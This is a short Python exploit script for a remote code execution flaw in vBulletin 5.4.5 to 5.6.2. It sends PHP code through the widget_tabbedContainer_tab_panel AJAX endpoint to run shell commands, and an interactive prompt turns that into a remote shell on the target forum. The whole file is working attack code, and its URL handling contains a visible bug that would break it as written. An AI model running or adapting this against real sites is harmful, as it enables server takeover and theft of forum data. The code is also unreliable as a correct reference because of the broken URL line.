import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# vBulletin widget_tabbedContainer_tab_panel RCE
# vBulletin version: 5.4.5 --> 5.6.2
class vBulletinRCE2020:
    
    def __init__(self, url):
        print (LogColors.BLUE + "victim vBulletin url: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.session = requests.Session()
    
    # run cmd
    def run_cmd(self, cmd):
        url = self.url.rsplit("/") + "/ajax/render/widget_tabbedcontainer_tab_panel"
        data = {
            "subWidgets[0][template]" : "widget_php", 
            "subWidgets[0][config][code]" : "echo shell_exec('%s'); exit;" % cmd
        }
        r = self.session.post(url, data)
        print (LogColors.YELLOW + r.text + LogColors.ENDC)

    # exploitation
    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        while True:
            try:
                cmd = input("$ ")
                if cmd == "exit":
                    sys.exit()
                self.run_cmd(cmd)
            except Exception as e:
                print (LogColors.RED + str(e) + LogColors.ENDC)
                sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    args = vars(parser.parse_args())
    cve = vBulletinRCE2020(args['url'])
    cve.exploit()

